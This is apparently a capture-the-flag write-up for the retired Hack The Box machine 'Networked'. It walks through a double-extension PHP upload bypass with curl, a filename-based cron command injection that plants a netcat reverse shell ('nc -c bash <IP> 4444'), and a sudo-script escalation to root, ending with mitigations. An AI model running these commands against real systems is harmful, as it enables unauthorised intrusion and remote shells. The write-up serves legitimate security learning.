---
machine: Networked
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, centos, upload-bypass, cron, command-injection, sudo]
---

# Networked — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

A `/backup` directory listing hands over the site's **source code**, turning the box into a white-box exercise: you can read how the upload whitelist is bypassed with a **double extension** (`.php.jpg`, executed because of a poorly anchored `AddHandler`) → shell as `apache`. Then `guly`'s "attack watcher" **cron** (`check_attack.php`) is injectable through a filename → `guly`. The jump to root is a `sudo` script that fails to quote a variable.

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
22/tcp open  ssh  OpenSSH 7.4 (protocol 2.0)
80/tcp open  http Apache httpd 2.4.6 (CentOS) PHP/5.4.16
```

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt
```

`/backup/` with `backup.tar`, plus `/uploads/`, `/photos.php`, `/upload.php`, `/lib.php`.

```bash
wget http://<IP>/backup/backup.tar && tar xf backup.tar && cat upload.php lib.php
```

## Access

1. **Upload bypass**: `upload.php` checks the extension against a whitelist and the MIME with `finfo`. A name like `x.php.jpg` passes both; Apache's `AddHandler application/x-httpd-php .php` (no `$` anchor) executes the middle `.php`.

```bash
cp shell.php shell.php.jpg
curl -F 'myFile=@shell.php.jpg' -F 'submit=Upload' http://<IP>/upload.php
curl http://<IP>/uploads/shell.php.jpg?cmd=id
```

2. **From `apache` to `guly`**: `crontab.guly` and `check_attack.php` exist; the script walks `/var/www/html/uploads` every few minutes and deletes anything that looks like an IP, **interpolating the filename into a command**. A name containing `;` injects a reverse shell.

```bash
cd /var/www/html/uploads
touch '; nc -c bash <IP> 4444 ;'
```

## Escalation

```bash
sudo -l
```

```text
User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

The script reads values and feeds them to `ifconfig`/`ifup` unquoted; a line with spaces is parsed as an assignment plus a command.

With a crafted `IFACE`/`NAME` value that runs `/bin/bash`, root follows.

## Pitfalls

- **`AddHandler` with `.php.jpg`**: if the server only executes the final extension, look for another combination; here the middle one works.
- **Cron every 3 minutes**: injection is not instant; wait for the next run.
- **Quoting in the filename**: the name must stay valid; create it with `touch` and single quotes.

## Lessons

- A code backup turns enumeration into reading the validation logic.
- Checking extension and MIME is not enough when the server executes middle extensions.
- A cron that concatenates filenames into an `exec` is a doorway.
- Mitigation: anchor `AddHandler` (`$`), validate by content, sanitize filenames, and quote variables in `sudo` scripts.
